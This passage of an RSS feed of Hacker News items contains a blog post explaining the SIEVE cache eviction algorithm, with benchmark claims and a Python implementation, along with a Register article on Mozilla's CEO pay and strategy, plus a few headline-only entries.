<td>0.4.3</td>
<td>2.57</td>
<td>0.56</td>
<td></td>
<td></td>
</tr>
<tr>
<td>zig+</td>
<td>Zig</td>
<td></td>
<td>0.11.0</td>
<td>2.74</td>
<td>0.56</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</article>
          </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[GCC Specs: An Introduction (116 pts)]]></title>
            <link>https://wozniak.ca/blog/2024/01/02/1/index.html</link>
            <guid>38850400</guid>
            <pubDate>Wed, 03 Jan 2024 03:35:56 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://wozniak.ca/blog/2024/01/02/1/index.html">https://wozniak.ca/blog/2024/01/02/1/index.html</a>, See on <a href="https://news.ycombinator.com/item?id=38850400">Hacker News</a></p>
Couldn't get https://wozniak.ca/blog/2024/01/02/1/index.html: Error: Request failed with status code 403]]></description>
        </item>
        <item>
            <title><![CDATA[Sieve is simpler than LRU (250 pts)]]></title>
            <link>https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/</link>
            <guid>38850202</guid>
            <pubDate>Wed, 03 Jan 2024 03:07:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/">https://cachemon.github.io/SIEVE-website/blog/2023/12/17/sieve-is-simpler-than-lru/</a>, See on <a href="https://news.ycombinator.com/item?id=38850202">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-md-component="container"> <main data-md-component="main"> <div data-md-component="content">  <article>  <p>Caching is a method of storing temporary data for quick access to keep the online world running smoothly. But with limited space, comes a critical decision: what to keep and what to discard. This is where <strong>eviction algorithms</strong> come into play. Our team recently designed a new cache eviction algorithm called <strong>SIEVE</strong>: it is both very effective and simple with just one FIFO queue.</p> <!-- more --> <h2 id="the-importance-of-simplicity">The Importance of Simplicity<a href="#the-importance-of-simplicity" title="Permanent link">¬∂</a></h2> <p>In the world of cache eviction algorithms, there's something to be said for keeping it simple. Complex algorithms, for all their sophistication, can bring their own set of headaches. They can be tricky to debug, sometimes unexpectedly drag down efficiency, and even put a damper on throughput and scalability because of their higher computational needs. </p> <p>On the flip side, simpler eviction methods, though maybe not as flashy in managing cache, have a knack for improving system throughput and scalability. Just look at examples like <a href="https://www.usenix.org/conference/nsdi13/technical-sessions/presentation/fan">MemC3</a> and <a href="https://www.usenix.org/conference/nsdi21/presentation/yang-juncheng">Segcache</a>. They rely on straightforward approaches like FIFO and manage to significantly boost system performance. It turns out, sometimes, the best move is to keep things uncomplicated!</p> <h2 id="meet-sieve-the-harmony-of-simplicity-and-efficiency">Meet SIEVE: The Harmony of Simplicity and Efficiency<a href="#meet-sieve-the-harmony-of-simplicity-and-efficiency" title="Permanent link">¬∂</a></h2> <p>SIEVE is an algorithm that decides what to keep in the cache and what to discard. But unlike its predecessors, it does this with a flair for simplicity and efficiency.</p> <h3 id="a-technical-walkthrough-of-sieve">A Technical Walkthrough of SIEVE<a href="#a-technical-walkthrough-of-sieve" title="Permanent link">¬∂</a></h3> <p>SIEVE is built on a FIFO queue, supplemented by a "hand" pointer that navigates through the cache. Each object in the queue has a bit indicating whether it's been visited. On a cache hit, SIEVE marks the object as visited. On a cache miss, SIEVE checks the object pointed to by the hand. If the object has been visited, its visited bit is reset, and the hand moves to the next position, keeping the retained object in its original position in the queue. This continues until an unvisited object is found and evicted. After eviction, the hand moves to the next position.</p> <figure> <p><img src="https://cachemon.github.io/SIEVE-website/blog/assets/sieve/sieve_diagram_animation.gif" alt="sieve-diagram-gif"> </p> <figcaption>An iilustration of SIEVE</figcaption> </figure> <p>At first glance, SIEVE is similar to CLOCK/Second Chance/FIFO-Reinsertion - <em>Note that they are different implementations of the same eviction algorithm</em>. Each algorithm maintains a single queue in which each object is associated with a visited bit to track its access status. Visited objects are retained (also called "survived") during an eviction. Notably, new objects are inserted at the head of the queue in both SIEVE and FIFO-Reinsertion. However, the hand in SIEVE moves from the tail to the head over time, whereas the hand in FIFO-Reinsertion stays at the tail. <strong>The key difference is where a retained object is kept.</strong> SIEVE keeps it in the old position, while FIFO-Reinsertion inserts it at the head, together with newly inserted objects.</p> <figure> <p><img src="https://cachemon.github.io/SIEVE-website/blog/assets/sieve/sieve-diagram.png" alt="figure-sieve-efficiency-small"> </p> <figcaption>SIEVE vs. CLOCK</figcaption> </figure> <!-- ```bash title="SIEVE pseudocode"
Input: The request x, doubly-linked queue T, cache size C, hand p
1: if x is in T then                            # Cache Hit
2:     x.visited <- true
3: else                                         # Cache Miss
4:     if |T| = C then                          # Cache Full
5:         obj <- p
6:         if obj is NULL then
7:             obj <- tail of T
8:         while obj.visited = true do
9:             obj.visited <- false
10:            obj <- obj.prev
11:            if obj is NULL then
12:                obj <- tail of T
13:        p <- obj.prev
14:        Discard obj in T                     # Eviction
15:    Insert x in the head of T
16:    x.visited <- false                       # Insertion
``` --> <p>For anyone interested, see the <a href="#sieve-cache-code">sieve cache implementation code</a> at the end of this blog post for a detailed example.</p> <h3 id="sieves-real-world-impact-a-performance-breakdown">SIEVE's Real-World Impact: A Performance Breakdown<a href="#sieves-real-world-impact-a-performance-breakdown" title="Permanent link">¬∂</a></h3> <p>SIEVE's practicality shines in its real-world application. </p> <h4 id="efficiency">Efficiency<a href="#efficiency" title="Permanent link">¬∂</a></h4> <p>Our evaluation, involving over 1559 traces from diverse datasets that together contain 247,017 million requests to 14,852 million objects, show that SIEVE outperforms all state-of-the-art eviction algorithms on more than 45% of the traces.</p> <p>The following figure shows the miss ratio reduction (from FIFO) of different algorithms across traces. The whiskers on the boxplots are defined using p10 and p90, allowing us to disregard extreme data and concentrate on the typical cases. SIEVE demonstrates the most significant reductions across nearly all percentiles. For example, SIEVE reduces FIFO‚Äôs miss ratio by more than 42% on 10% of the traces (top whisker) with a mean of 21% on the one of the largest CDN company dataset. As a comparison, all other algorithms have smaller reductions on this dataset. Compared to advanced algorithms, e.g., ARC, SIEVE reduces ARC miss ratio by up to 63.2% with a mean of 1.5%.</p> <!-- While SIEVE excels with large caches, it faces competition at smaller sizes from algorithms like TwoQ and LHD. This is due to their ability to quickly discard low-value objects, a challenge for SIEVE when cache space is limited. However, at larger cache sizes, where real-world applications often operate, SIEVE consistently outperforms its peers. --> <figure> <p><img src="https://cachemon.github.io/SIEVE-website/blog/assets/sieve/efficiency-large.png" alt="figure-sieve-efficiency-large"></p> <!-- <figcaption>Image caption</figcaption> --> </figure> <h4 id="simplicity">Simplicity<a href="#simplicity" title="Permanent link">¬∂</a></h4> <p>SIEVE is very simple. We delved into the most popular cache libraries and systems across five diverse programming languages: C++, Go, JavaScript, Python, and Rust. </p> <p>Despite the varied ways LRU is implemented across these libraries - some opt for doubly-linked lists, others for arrays - integrating SIEVE turned out to be a breeze. Whether it's the structural differences or the coding style, SIEVE slotted in smoothly. As illustrated in the Table, the required code changes to replace LRU with SIEVE were minimal. In all cases, it took no more than 21 lines of code modifications (tests not included).</p> <figure> <table> <thead> <tr> <th>Cache library</th> <th>Language</th> <th>Lines</th> <th>Hour of Work</th> </tr> </thead> <tbody> <tr> <td><a href="https://github.com/cacheMon/groupcache">groupcache</a></td> <td>Golang</td> <td>21</td> <td>&lt;1</td> </tr> <tr> <td><a href="https://github.com/cacheMon/mnemonist">mnemonist</a></td> <td>Javascript</td> <td>12</td> <td>1</td> </tr> <tr> <td><a href="https://github.com/cacheMon/lru-rs">lru-rs</a></td> <td>Rust</td> <td>16</td> <td>1</td> </tr> <tr> <td><a href="https://github.com/cacheMon/lru-dict">lru-dict</a></td> <td>Python + C</td> <td>21</td> <td>&lt;1</td> </tr> </tbody> </table> </figure> <h4 id="throughput">Throughput<a href="#throughput" title="Permanent link">¬∂</a></h4> <p>Besides efficiency, throughput is the other important metric for caching systems. Although we have implemented SIEVE in five different libraries, we focus on Cachelib‚Äôs results.</p> <p>Compared to these LRU-based algorithms, SIEVE does not require ‚Äúpromotion‚Äù at each cache hit. Therefore, it is faster and more scalable. At a single thread, SIEVE is 16% (17%) faster than the optimized LRU (TwoQ) and on the tested traces. At 16 threads, SIEVE shows more than 2√ó higher throughput than the optimized LRU and TwoQ.</p> <!-- In Cachelib, LRU and TwoQ have been tweaked for better scalability. With smart moves like limiting promotion frequency and introducing lock combining, we've seen a 6√ó increase in throughput at 16 threads, a significant jump from just one thread on the Twitter trace. On the other hand, the classic, unoptimized LRU hits its limit at 4 threads.

SIEVE takes a different approach, eliminating the need for promotion with each cache hit. This simplicity pays off. On a single thread, SIEVE is 16% faster than the spruced-up LRU and 17% quicker than TwoQ on both traces. When ramped up to 16 threads, SIEVE's throughput more than doubles compared to these algorithms on the Meta trace, showcasing its effortless scalability. --> <h3 id="sieve-is-beyond-an-eviction-algorithm">SIEVE is beyond an eviction algorithm<a href="#sieve-is-beyond-an-eviction-algorithm" title="Permanent link">¬∂</a></h3> <p>SIEVE isn't just playing the part of a cache eviction algorithm; it's stepping up as a cache design superstar. Think of it like giving a fresh spin to classics. We've plugged SIEVE into <a href="https://www.usenix.org/conference/hotstorage18/presentation/vietri">LeCaR</a>, <a href="https://www.vldb.org/conf/1994/P439.PDF">TwoQ</a>, <a href="https://www.usenix.org/conference/fast-03/arc-self-tuning-low-overhead-replacement-cache">ARC</a>, and <a href="https://dl.acm.org/doi/10.1145/3600006.3613147">S3-FIFO</a>, swapping out their LRU or FIFO queue for a SIEVE one.</p> <p>Swapping LRU with SIEVE in these algorithms isn't just a minor tweak; it's more like giving them a turbo boost. Take ARC-SIEVE, for instance ‚Äì it's turning heads with its slick efficiency, especially noticeable across different cache sizes. We didn't stop there. We pushed SIEVE a bit further by letting it peek into the future ‚Äì well, sort of. We tested how well it could guess the next request. It turns out, with this extra bit of foresight, SIEVE is nailing it, outperforming the rest in almost all scenarios.</p> <figure> <p><img src="https://cachemon.github.io/SIEVE-website/blog/assets/sieve/sieve_queue_all_large.svg" alt="figure-sieve-efficiency-small"> </p> <!-- <figcaption>An iilustration of SIEVE</figcaption> --> </figure> <h3 id="sieve-is-not-scan-resistant">SIEVE is not scan-resistant<a href="#sieve-is-not-scan-resistant" title="Permanent link">¬∂</a></h3> <p>Besides web cache workloads, we evaluated SIEVE on some block cache workloads. However, we find that SIEVE sometimes shows a miss ratio higher than LRU. The primary reason for this discrepancy is that SIEVE is not scan-resistant. In block cache workloads, which frequently feature scans, popular objects often intermingle with objects from scans. Consequently, both types of objects are rapidly evicted after insertion.</p> <p><a href="https://brooker.co.za/blog/2023/12/15/sieve.html">Marc's latest blog post</a> has explored the idea of making sieve scan-resistant by adding a small counter for each item. It shows some wins and losses on different workloads. We're really excited to see how this plays out in the real world. If you're an engineer, a tech enthusiast, or just someone who enjoys playing around with systems, we'd absolutely love for you to give SIEVE a whirl in your setups. </p> <h2 id="wed-love-to-hear-from-you">We'd Love to Hear from you<a href="#wed-love-to-hear-from-you" title="Permanent link">¬∂</a></h2> <p>As we wrap up this blog post, we would like to give a big shoutout to the people and organizations that open-sourced and shared the traces. We believe SIEVE presents an intriguing opportunity to explore and enhance the efficiency of web caching. <strong>If you have questions, thoughts, or if you've given SIEVE a try, we're eager to hear from you! Don't hesitate to get in touch :-)</strong></p> <h2 id="appendix">Appendix<a href="#appendix" title="Permanent link">¬∂</a></h2> <div id="sieve-cache-code"><p><span>SIEVE Python Implementation</span></p><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span>class</span> <span>Node</span><span>:</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>value</span><span>):</span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>        <span>self</span><span>.</span><span>value</span> <span>=</span> <span>value</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>        <span>self</span><span>.</span><span>visited</span> <span>=</span> <span>False</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>        <span>self</span><span>.</span><span>prev</span> <span>=</span> <span>None</span>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>        <span>self</span><span>.</span><span>next</span> <span>=</span> <span>None</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span>class</span> <span>SieveCache</span><span>:</span>
</span><span id="__span-0-9"><a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>    <span>def</span> <span>__init__</span><span>(</span><span>self</span><span>,</span> <span>capacity</span><span>):</span>
</span><span id="__span-0-10"><a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>        <span>self</span><span>.</span><span>capacity</span> <span>=</span> <span>capacity</span>
</span><span id="__span-0-11"><a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>        <span>self</span><span>.</span><span>cache</span> <span>=</span> <span>{}</span>  <span># To store cache items as {value: node}</span>
</span><span id="__span-0-12"><a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>        <span>self</span><span>.</span><span>head</span> <span>=</span> <span>None</span>
</span><span id="__span-0-13"><a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>        <span>self</span><span>.</span><span>tail</span> <span>=</span> <span>None</span>
</span><span id="__span-0-14"><a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>        <span>self</span><span>.</span><span>hand</span> <span>=</span> <span>None</span>
</span><span id="__span-0-15"><a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>        <span>self</span><span>.</span><span>size</span> <span>=</span> <span>0</span>
</span><span id="__span-0-16"><a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>
</span><span id="__span-0-17"><a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>    <span>def</span> <span>_add_to_head</span><span>(</span><span>self</span><span>,</span> <span>node</span><span>):</span>
</span><span id="__span-0-18"><a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>        <span>node</span><span>.</span><span>next</span> <span>=</span> <span>self</span><span>.</span><span>head</span>
</span><span id="__span-0-19"><a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>        <span>node</span><span>.</span><span>prev</span> <span>=</span> <span>None</span>
</span><span id="__span-0-20"><a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>        <span>if</span> <span>self</span><span>.</span><span>head</span><span>:</span>
</span><span id="__span-0-21"><a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>            <span>self</span><span>.</span><span>head</span><span>.</span><span>prev</span> <span>=</span> <span>node</span>
</span><span id="__span-0-22"><a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>        <span>self</span><span>.</span><span>head</span> <span>=</span> <span>node</span>
</span><span id="__span-0-23"><a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>        <span>if</span> <span>self</span><span>.</span><span>tail</span> <span>is</span> <span>None</span><span>:</span>
</span><span id="__span-0-24"><a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>            <span>self</span><span>.</span><span>tail</span> <span>=</span> <span>node</span>
</span><span id="__span-0-25"><a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>
</span><span id="__span-0-26"><a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>    <span>def</span> <span>_remove_node</span><span>(</span><span>self</span><span>,</span> <span>node</span><span>):</span>
</span><span id="__span-0-27"><a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>        <span>if</span> <span>node</span><span>.</span><span>prev</span><span>:</span>
</span><span id="__span-0-28"><a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>            <span>node</span><span>.</span><span>prev</span><span>.</span><span>next</span> <span>=</span> <span>node</span><span>.</span><span>next</span>
</span><span id="__span-0-29"><a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>        <span>else</span><span>:</span>
</span><span id="__span-0-30"><a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>            <span>self</span><span>.</span><span>head</span> <span>=</span> <span>node</span><span>.</span><span>next</span>
</span><span id="__span-0-31"><a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>        <span>if</span> <span>node</span><span>.</span><span>next</span><span>:</span>
</span><span id="__span-0-32"><a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>            <span>node</span><span>.</span><span>next</span><span>.</span><span>prev</span> <span>=</span> <span>node</span><span>.</span><span>prev</span>
</span><span id="__span-0-33"><a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>        <span>else</span><span>:</span>
</span><span id="__span-0-34"><a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>            <span>self</span><span>.</span><span>tail</span> <span>=</span> <span>node</span><span>.</span><span>prev</span>
</span><span id="__span-0-35"><a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>
</span><span id="__span-0-36"><a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>    <span>def</span> <span>_evict</span><span>(</span><span>self</span><span>):</span>
</span><span id="__span-0-37"><a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>        <span>obj</span> <span>=</span> <span>self</span><span>.</span><span>hand</span> <span>if</span> <span>self</span><span>.</span><span>hand</span> <span>else</span> <span>self</span><span>.</span><span>tail</span>
</span><span id="__span-0-38"><a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>        <span>while</span> <span>obj</span> <span>and</span> <span>obj</span><span>.</span><span>visited</span><span>:</span>
</span><span id="__span-0-39"><a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>            <span>obj</span><span>.</span><span>visited</span> <span>=</span> <span>False</span>
</span><span id="__span-0-40"><a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>            <span>obj</span> <span>=</span> <span>obj</span><span>.</span><span>prev</span> <span>if</span> <span>obj</span><span>.</span><span>prev</span> <span>else</span> <span>self</span><span>.</span><span>tail</span>
</span><span id="__span-0-41"><a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>        <span>self</span><span>.</span><span>hand</span> <span>=</span> <span>obj</span><span>.</span><span>prev</span> <span>if</span> <span>obj</span><span>.</span><span>prev</span> <span>else</span> <span>None</span>
</span><span id="__span-0-42"><a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>        <span>del</span> <span>self</span><span>.</span><span>cache</span><span>[</span><span>obj</span><span>.</span><span>value</span><span>]</span>
</span><span id="__span-0-43"><a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>        <span>self</span><span>.</span><span>_remove_node</span><span>(</span><span>obj</span><span>)</span>
</span><span id="__span-0-44"><a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>        <span>self</span><span>.</span><span>size</span> <span>-=</span> <span>1</span>
</span><span id="__span-0-45"><a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>
</span><span id="__span-0-46"><a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>    <span>def</span> <span>access</span><span>(</span><span>self</span><span>,</span> <span>x</span><span>):</span>
</span><span id="__span-0-47"><a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>        <span>if</span> <span>x</span> <span>in</span> <span>self</span><span>.</span><span>cache</span><span>:</span>  <span># Cache Hit</span>
</span><span id="__span-0-48"><a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>            <span>node</span> <span>=</span> <span>self</span><span>.</span><span>cache</span><span>[</span><span>x</span><span>]</span>
</span><span id="__span-0-49"><a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>            <span>node</span><span>.</span><span>visited</span> <span>=</span> <span>True</span>
</span><span id="__span-0-50"><a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>        <span>else</span><span>:</span>  <span># Cache Miss</span>
</span><span id="__span-0-51"><a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>            <span>if</span> <span>self</span><span>.</span><span>size</span> <span>==</span> <span>self</span><span>.</span><span>capacity</span><span>:</span>  <span># Cache Full</span>
</span><span id="__span-0-52"><a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a>                <span>self</span><span>.</span><span>_evict</span><span>()</span>  <span># Eviction</span>
</span><span id="__span-0-53"><a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a>            <span>new_node</span> <span>=</span> <span>Node</span><span>(</span><span>x</span><span>)</span>
</span><span id="__span-0-54"><a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>            <span>self</span><span>.</span><span>_add_to_head</span><span>(</span><span>new_node</span><span>)</span>
</span><span id="__span-0-55"><a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>            <span>self</span><span>.</span><span>cache</span><span>[</span><span>x</span><span>]</span> <span>=</span> <span>new_node</span>
</span><span id="__span-0-56"><a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>            <span>self</span><span>.</span><span>size</span> <span>+=</span> <span>1</span>
</span><span id="__span-0-57"><a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a>            <span>new_node</span><span>.</span><span>visited</span> <span>=</span> <span>False</span>  <span># Insertion</span>
</span><span id="__span-0-58"><a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a>
</span><span id="__span-0-59"><a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a>    <span>def</span> <span>show_cache</span><span>(</span><span>self</span><span>):</span>
</span><span id="__span-0-60"><a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a>        <span>current</span> <span>=</span> <span>self</span><span>.</span><span>head</span>
</span><span id="__span-0-61"><a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a>        <span>while</span> <span>current</span><span>:</span>
</span><span id="__span-0-62"><a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a>            <span>print</span><span>(</span><span>f</span><span>'</span><span>{</span><span>current</span><span>.</span><span>value</span><span>}</span><span> (Visited: </span><span>{</span><span>current</span><span>.</span><span>visited</span><span>}</span><span>)'</span><span>,</span> <span>end</span><span>=</span><span>' -&gt; '</span> <span>if</span> <span>current</span><span>.</span><span>next</span> <span>else</span> <span>'</span><span>\n</span><span>'</span><span>)</span>
</span><span id="__span-0-63"><a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a>            <span>current</span> <span>=</span> <span>current</span><span>.</span><span>next</span>
</span><span id="__span-0-64"><a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a>
</span><span id="__span-0-65"><a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a><span># Example usage</span>
</span><span id="__span-0-66"><a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a><span>cache</span> <span>=</span> <span>SieveCache</span><span>(</span><span>3</span><span>)</span>
</span><span id="__span-0-67"><a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a><span>cache</span><span>.</span><span>access</span><span>(</span><span>'A'</span><span>)</span>
</span><span id="__span-0-68"><a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a><span>cache</span><span>.</span><span>access</span><span>(</span><span>'B'</span><span>)</span>
</span><span id="__span-0-69"><a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a><span>cache</span><span>.</span><span>access</span><span>(</span><span>'C'</span><span>)</span>
</span><span id="__span-0-70"><a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a><span>cache</span><span>.</span><span>access</span><span>(</span><span>'D'</span><span>)</span>
</span><span id="__span-0-71"><a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a><span>cache</span><span>.</span><span>show_cache</span><span>()</span>
</span></code></pre></div> </article> </div>  </main>  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[With revenue and users declining, Mozilla CEO gets a 20% raise (355 pts)]]></title>
            <link>https://www.theregister.com/2024/01/02/mozilla_in_2024_ai_privacy/</link>
            <guid>38849580</guid>
            <pubDate>Wed, 03 Jan 2024 01:29:19 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.theregister.com/2024/01/02/mozilla_in_2024_ai_privacy/">https://www.theregister.com/2024/01/02/mozilla_in_2024_ai_privacy/</a>, See on <a href="https://news.ycombinator.com/item?id=38849580">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="body">
<p>Mozilla closed out 2023 with a report that dodges its flatlining browser market share and Mozilla.social beta in favor of calls for a faster pace from its highly paid CEO.</p>
<p>According to the company's filings, Mitchell Baker's compensation went from $5,591,406 <a target="_blank" rel="nofollow" href="https://assets.mozilla.net/annualreport/2021/mozilla-fdn-990-ty21-public-disclosure.pdf">in 2021</a> [PDF] to $6,903,089 <a target="_blank" rel="nofollow" href="https://assets.mozilla.net/annualreport/2022/mozilla-fdn-990-ty22-public-disclosure.pdf">in 2022</a> [PDF]. It's quite the jump considering that revenues declined from $527,585,000 to $510,389,000 in <a target="_blank" rel="nofollow" href="https://assets.mozilla.net/annualreport/2022/mozilla-fdn-2022-fs-final-0908.pdf">the same period</a> [PDF].</p>
<p>Despite the executive payout, Firefox continues to trail Google and even Microsoft in desktop browser market share. While it has not suffered any catastrophic losses, neither has it made any significant gains.</p>

    

<p>Baker, however, would very much like to speed things up and says in the <a target="_blank" rel="nofollow" href="https://stateof.mozilla.org/#">State of Mozilla report</a>: "The pace is not enough, the impact is not enough."</p>

        


        

<p>Unsurprisingly for a technology company, the report is heavy on AI going mainstream where Mozilla reckons it can make an impact in the technology, particularly with regard to open source developers and privacy.</p>
<p>Mozilla's adventures in AI? The organization says it has 15 engineers working on open source large language models and is working on use cases in the healthcare space. Moez Draief, managing director of Mozilla.ai, said: "There's a lot of structured data work in that industry that will feed the language models; we don't have to invent it."</p>
<ul>

<li><a href="https://www.theregister.com/2023/12/21/mozilla_decides_trusted_types_is/">Mozilla decides Trusted Types is a worthy security feature</a></li>

<li><a href="https://www.theregister.com/2023/12/20/firefox_121_released/">Penguins get their Wayland with Firefox 121</a></li>

<li><a href="https://www.theregister.com/2023/11/21/ad_block_google/">Firefox slow to load YouTube? Just another front in Google's war on ad blockers</a></li>

<li><a href="https://www.theregister.com/2023/11/15/google_amazon_microsoft_mozilla/">Google, Amazon, Microsoft make the Mozilla naughty list for Christmas shopping</a></li>
</ul>
<p>Earlier this year, Mozilla had to <a target="_blank" href="https://www.theregister.com/2023/07/06/mozilla_ai_explain_shift/">hit pause on its AI chatbot</a> after the service served up a worrying amount of nonsense in response to user queries.</p>
<p>Chief product officer Steve Teixeira notes in the report the rapid growth of AI and social networks, although warns that Mozilla.social is unlikely to move beyond the experimentation phase in 2024. He says that Mozilla would be "exploring ways to better integrate advertising while adhering to our focus on privacy and choice," including web browsing.</p>

        

<p>Teixeira also acknowledged subscription services such as Mozilla VPN and Relay.</p>
<p>It will be interesting to see how Mozilla picks up the pace in 2024. As well as Teixeira's comments regarding advertising, Baker notes: "We need to be faster in prototyping, launching, learning, and iterating ... This requires rich data, and so we will be moving in that direction, but in a very Mozilla way."</p>
<p>Surely not slurping telemetry?</p>

        

<p>According to the report, the "Mozilla way" is all about privacy, encryption, and keeping customer data safe. Hopefully, it will also be about <a target="_blank" href="https://www.theregister.com/2023/09/29/mozilla_asleep_at_wheel/">innovation</a> rather than scattering AI fairy dust over its product line. ¬Æ</p>                                
                    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Can a pill prevent deaths from venomous snakebites? (106 pts)]]></title>
            <link>https://www.latimes.com/environment/story/2023-12-24/can-a-pill-prevent-deaths-from-venomous-snake-bites</link>
            <guid>38848566</guid>
            <pubDate>Tue, 02 Jan 2024 23:26:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.latimes.com/environment/story/2023-12-24/can-a-pill-prevent-deaths-from-venomous-snake-bites">https://www.latimes.com/environment/story/2023-12-24/can-a-pill-prevent-deaths-from-venomous-snake-bites</a>, See on <a href="https://news.ycombinator.com/item?id=38848566">Hacker News</a></p>
